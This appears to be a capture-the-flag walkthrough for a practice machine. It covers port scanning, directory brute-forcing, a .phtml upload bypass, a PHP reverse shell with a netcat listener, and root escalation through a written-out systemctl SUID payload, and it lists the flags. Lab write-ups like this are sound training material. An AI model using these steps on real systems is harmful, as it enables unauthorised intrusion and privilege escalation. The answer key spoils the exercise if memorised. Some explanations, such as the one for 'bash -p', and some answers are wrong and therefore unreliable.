Task 1  Deploy the machine :
----

1.Deploy the machine
>>No answer needed

----

Task 2  Reconnaissance :
----

>>GAINED THESE INFORMATION VIA NMAP :
```bash
nmap -sC -sV 10.10.252.214 
```

1.There are many nmap "cheatsheets" online that you can use too.
>>No answer needed

2.Scan the box, how many ports are open?
>>6

3.What version of the squid proxy is running on the machine?
>>3.5.12

4.How many ports will nmap scan if the flag -p-400 was used?
>>400

5.Using the nmap flag -n what will it not resolve?
>>DNS

6.What is the most likely operating system this machine is running?
>>Ubuntu

7.What port is the web server running on?
>>3333

8.Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)
>>No answer needed

----

Task 3  Locating directories using GoBuster :
----

>>ACCESSED THE WEBISTE VIA : http://10.10.252.214:3333
>>WEBSITE NAME : Vuln University 
>>ABOUT THE WEBSITE : This website is about "university"
>>HOME PAGE OF THE WEBSITE ACCESSED : http://10.10.252.214:3333/index.html
>>WEB CONTENTS OF HOME PAGE : The Contents are "COURSE","TEACHER","EVENTS","CONTACT","APPLY NOW" and so on..
>>ACCESS CONTENTS : If we access the contents it will redirect "index.html" to "#" which is 
http://10.10.252.214:3333/#

>>FOUND THE DIRECTORY INFORMATION VIA GOBUSTER :
```bash
gobuster dir -u http://10.10.252.214:3333 -w /usr/share/wordlists/dirbuster/
directory-list-lowercase-2.3-small.txt
```
>>FOUND THE HIDDEN FILE UPLOAD DIRECTORY : /internal/

1.Lets first start of by scanning the website to find any hidden directories. To do this, we're going to use GoBuster.
>>No answer needed 

2.What is the directory that has an upload form page?
>>/internal/

----

Task 4  Compromise the webserver :
----

>>UPLOADING FILES IN THE WEBSITE VIA UPLOADS DIRECTORY ON http://10.10.252.214:3333/internal/ BUT THE PHP EXTENSION IS BLOCKED.
>>TRYING THE SAME FILE BUT WIHT SOME EXTENSIONS LIKE .php2 , .php3 , .phtml ON THE WEBSITE 
>>AT THAT TIME .phtml WORKED AND THE UPLOADS DISPLAY THE MESSAGE "SUCCESS"
>>MADE A REVERSE-SHELL PAYLOAD WITH .phtml EXTENSION[specify the listening port and port number] AND UPLOADED THE PAYLOAD SUCCESSFULLY.
>>TO MAKE A REVERSE-SHELL CONNECTION MAKE NETCAT SESSION. 
```bash   
nc -lvnp 9001
```
>>ACCESS THE WEBSITE WITH http://10.10.252.214:3333/internal/uploads/reverse-shell-php.phtml TO MAKE A REVERSE CONNECTION TO THE LOCAL MACHINE. 
>>TO GET USERNAME WHO MANAGES THE WEBSERVER NAVIGATE TO 
```bash
cd home
ls
```
THERE IS THE USERNAME "bill"
>>TO GET THE USER FLAG 
```bash
cd bill
ls
cat user.txt
```

1.Try upload a few file types to the server, what common extension seems to be blocked?
>>.php

2.To identify which extensions are not blocked, we're going to fuzz the upload form.
>>No answer needed

3.Run this attack, what extension is allowed?
>>.phmtl

4.Make a netcat connection?
>>No answer needed

5.What is the name of the user who manages the webserver? 
>>bill

6.What is the user flag?
>>8bd7992fbe8a6ad22a63361004cfcedb

----

Task 5  Privilege Escalation :
----

>>THIS IS COMMAND TO CONVERT THE SHELL AS REGULAR "bash" SHELL
```python
python -c "import pty; pty.spawn('/bin/bash')"
```
```bash
$
www-data@vulnuniversity:/$ 
```

>>THIS IS THE COMMAND TO FIND THE SUID PERMISSION.THERE WE NOTICE /bin/systemctl (Systemctl is the tool/service used to control the systemd init service)  
```bash
www-data@vulnuniversity:/$ find/ -user root -perm -4000 -print 2>/dev/null
[/bin/systemctl]
```

>>THIS IS THE PAYLOAD TO ESCALATE OUR PRIVELEGE AS ROOT 
```bash
 #Create an environment variable!. whixh makes a temporary service file
TF=$(mktemp).service
 #Create a unit file and assign this to the environment variable
echo '[Service]
 #Here we mentioned the type of this command execution 
Type=oneshot
 #This command will execute as root and "setuid" to /bin/bash
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
 #This is the path where we execute above commands to gain the root privelege  
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

>>THIS COMMAND USED TO ESCALATE OUR PRIVELEGE AS ROOT. 
>>["bash -p" THIS COMMAND USED TO DISPLAY READLINE FUNCTION NAMES AND BINDINGS IN SUCH A WAY THA THEY CAN BE INPUT OR IN A READLINE INITIALIZATION FILE] .
```bash
www-data@vulnuniversity:/$ bash -p 
bash-4.3# cd root
bash-4.3# ls 
bash-4.3# cat root.txt 
```

1.On the system, search for all SUID files. What file stands out?
>>/bin/systemctl

2.Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer?
>>a58ff8579f0a9270368d33a9966c7fd5

----